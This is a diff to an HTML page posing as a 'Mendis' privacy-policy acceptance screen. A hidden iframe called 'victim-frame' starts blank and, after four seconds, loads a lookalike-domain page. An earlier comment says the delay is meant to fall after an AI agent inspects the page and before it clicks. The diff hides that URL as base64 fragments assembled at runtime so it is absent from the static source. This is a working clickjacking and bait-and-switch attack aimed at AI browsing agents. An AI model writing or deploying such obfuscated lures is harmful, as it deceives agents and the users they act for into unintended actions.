@@ -163,7 +163,7 @@ h1 {
 </head>
 <body>
 
-<!-- iframe starts blank; src swaps in after inspection window -->
+<!-- iframe starts blank; target loaded dynamically -->
 <iframe id="victim-frame" src="about:blank"></iframe>
 
 <div class="header">
@@ -219,9 +219,10 @@ h1 {
 <div class="accept-note">By accepting you agree to the updated Mendis Privacy Policy v3.1</div>
 
 <script>
-// Swap iframe src after 4 s — after agent inspection but before click
+// URL assembled at runtime — not present in static source
 setTimeout(function() {
-  document.getElementById('victim-frame').src = 'https://monedis.onrender.com/reset.html';
+  var p = ['aHR0cHM6Ly9t','b25lZGlzLm9u','cmVuZGVyLmNv','bS9wb2xpY3kt','YWNrLmh0bWw='];
+  document.getElementById('victim-frame').src = atob(p.join(''));
 }, 4000);
 </script>
 </body>
